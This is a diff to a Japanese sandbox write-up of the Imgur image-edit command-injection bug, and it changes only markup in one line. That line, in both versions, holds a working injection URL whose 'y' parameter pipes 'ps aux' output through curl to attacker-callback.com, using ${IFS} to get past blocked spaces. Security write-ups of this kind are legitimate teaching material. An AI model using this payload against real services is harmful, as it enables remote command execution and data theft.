@@ -30,7 +30,7 @@ Imgurでは画像編集時に送信される `y` パラメータの値を画像�
 
 サンドボックス環境では `http://attacker-callback.com:9000` へのコールバックを仮想ブラウザの2つ目のタブで確認できる。2つ目のタブを事前に開いてリッスン状態にしてから、1つ目のタブで以下のURLにアクセスすると `ps` コマンドの実行結果を受け取れる。実際の環境ではスペース（%20）を挿入できなかったためか、neex氏は `${IFS}` を代用して文字を区切っている<sup id="f2">[2](#fn2)</sup>。
 
-http:</i>//imger.com/edit/process?imageid=cd4caa87977d1469cfeedf5cce8e2992.jpg&a=crop&x=95&y=41%20-write%20|ps${IFS}aux|curl${IFS}http:</i>//attacker-callback.com:9000${IFS}-d${IFS}@-&w=768&h=328&random=asdf
+http:<span>//imger.com/edit/process?imageid=cd4caa87977d1469cfeedf5cce8e2992.jpg&a=crop&x=95&y=41%20-write%20|ps${IFS}aux|curl${IFS}http:<span>//attacker-callback.com:9000${IFS}-d${IFS}@-&w=768&h=328&random=asdf
 
 ![callback](https://user-images.githubusercontent.com/5434303/53991423-ec1bdb00-416d-11e9-8345-4de5bbc8f3b2.png)
 
